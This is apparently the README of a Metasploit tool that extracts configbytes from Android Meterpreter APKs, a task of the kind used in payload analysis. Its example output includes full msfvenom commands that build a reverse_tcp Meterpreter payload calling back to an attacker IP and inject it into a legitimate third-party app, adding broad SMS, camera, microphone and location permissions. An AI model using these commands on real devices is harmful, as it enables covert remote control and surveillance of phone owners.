apk_configbytes_extract
==========

    apk_configbytes_extract - a tool to extract configbytes from an android payload.
    Usage: ./apk_configbytes_extract.rb < -a apk-file -o path -j path > [options]
    Example: ./apk_configbytes_extract.rb -a metasploit.apk -o /root/configbytes.txt -j /root/fernflower.jar
     
    Options:
        -a, --apk             <path>     Specify apk to extract configbytes
        -o, --out             <path>     Save configbytes to a file
        -j, --jar             <path>     Specify fernflower path
        -v, --verbose                    Displays verbose output
        -k, --keep                       Keep working directory
        -h, --help                       Show this message

---

TOOLS: (JAVA NEEDED)
-----------------------------
- d2j-dex2jar
- apktool
- fernflower.jar

---

### Fernflower

Among the tools needed to run apk_configbytes_extract.rb, you will need the `fernflower.jar` file

Follow these steps:

    git clone https://github.com/JetBrains/intellij-community
    cd intellij-community/plugins/java-decompiler/engine/
    ./gradlew build

You will find `fernflower.jar` in `intellij-community/plugins/java-decompiler/engine/build/libs/`

---

### Side Note:
If you do not select an output option...

(ex. `./apk_configbytes_extract -a sp_injected.apk -j /root/fernflower.jar`)

program will still run. 

However, the temporary directory where work will be done is kept and configbytes are saved inside the directory 
as configbytes.txt

---

### Example Ouput(s):
    root@kali:~/git/metasploit-framework# ./msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f raw -o /tmp/payload.apk
    [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
    [-] No arch selected, selecting arch: dalvik from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 10185 bytes
    Saved as: /tmp/payload.apk
    
    root@kali:~/git/metasploit-framework# tools/payloads/configbytes/apk_configbytes_extract.rb -a /tmp/payload.apk -j /root/fernflower.jar
    [+] No output option selected, working in /tmp/d20210622-3759-55s3ej/
    [+] Renaming apk file to zip file
    [+] Extracting zip file for dex file
    [+] Using d2j-dex2jar on dex file to create jar file
    [+] Extracting jar file for class files
    [+] Using apktool to read AndroidManifest
    [+] Package path found: com/metasploit/stage
    [+] Using fernflower to change class file to java file
    [+] Class Path: /tmp/d20210622-3759-55s3ej/classes/com/metasploit/stage
    [+] Metasploit Payload Class found!: /tmp/d20210622-3759-55s3ej/java/Payload.java
    [+] Saved as: /tmp/d20210622-3759-55s3ej/configbytes.txt
    
    root@kali:~/git/metasploit-framework# file /tmp/d20210622-3759-55s3ej/configbytes.txt
    /tmp/d20210622-3759-55s3ej/configbytes.txt: ASCII text, with very long lines, with no line terminators
    
    
    
    
    root@kali:~/git/metasploit-framework# ./msfvenom -p android/meterpreter/reverse_tcp -x /tmp/com.ezequielc.successplanner.apk LHOST=192.168.1.8 LPORT=4444 -f raw -o /tmp/sp_injected.apk
    Using APK template: /tmp/com.ezequielc.successplanner.apk
    [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
    [-] No arch selected, selecting arch: dalvik from the payload
    [*] Creating signing key and keystore..
    [*] Decompiling original APK..
    [*] Decompiling payload APK..
    [*] Locating hook point..
    [*] Adding payload as package com.ezequielc.successplanner.sycxe
    [*] Loading /tmp/d20210622-3972-1q5ijmm/original/smali/com/ezequielc/successplanner/activities/MainActivity.smali and injecting payload..
    [*] Poisoning the manifest with meterpreter permissions..
    [*] Adding <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    [*] Adding <uses-permission android:name="android.permission.WAKE_LOCK"/>
    [*] Adding <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    [*] Adding <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    [*] Adding <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    [*] Adding <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    [*] Adding <uses-permission android:name="android.permission.READ_CONTACTS"/>
    [*] Adding <uses-permission android:name="android.permission.READ_SMS"/>
    [*] Adding <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    [*] Adding <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    [*] Adding <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    [*] Adding <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    [*] Adding <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    [*] Adding <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    [*] Adding <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    [*] Adding <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    [*] Adding <uses-permission android:name="android.permission.CALL_PHONE"/>
    [*] Adding <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    [*] Adding <uses-permission android:name="android.permission.SEND_SMS"/>
    [*] Adding <uses-permission android:name="android.permission.CAMERA"/>
    [*] Rebuilding apk with meterpreter injection as /tmp/d20210622-3972-1q5ijmm/output.apk
    [*] Signing /tmp/d20210622-3972-1q5ijmm/output.apk
    [*] Aligning /tmp/d20210622-3972-1q5ijmm/output.apk
    Payload size: 1991870 bytes
    Saved as: /tmp/sp_injected.apk
    
    root@kali:~/git/metasploit-framework# tools/payloads/configbytes/apk_configbytes_extract.rb -a /tmp/sp_injected.apk -j /root/fernflower.jar -o /root/sp_configbytes.txt
    [+] Renaming apk file to zip file
    [+] Extracting zip file for dex file
    [+] Using d2j-dex2jar on dex file to create jar file
    [+] Extracting jar file for class files
    [+] Using apktool to read AndroidManifest
    [+] Package path found: com/ezequielc/successplanner
    [+] Looking for Backdoored Metasploit Payload Classes
    [+] Using fernflower to change class files to java files
    [+] Class Path: /tmp/d20210622-4256-1yq1f6k/classes/com/ezequielc/successplanner/sycxe
    [+] Metasploit Backdoored Payload Class found! :/tmp/d20210622-4256-1yq1f6k/java/Wlsba.java
    [+] Saved as: /root/sp_configbytes.txt

    root@kali:~/git/metasploit-framework# file /root/sp_configbytes.txt
    /root/sp_configbytes.txt: ASCII text, with very long lines, with no line terminators

---

### In the end
apk_configbytes_extract will save configbytes of an apk in a seperate file, preferably a text file
(see [Payload 
Class](https://github.com/rapid7/metasploit-payloads/blob/1a763c6a547002f22016f10a620e975cd0c942b7/java/androidpayload/app/src/com/metasploit/stage/Payload.java#L32))

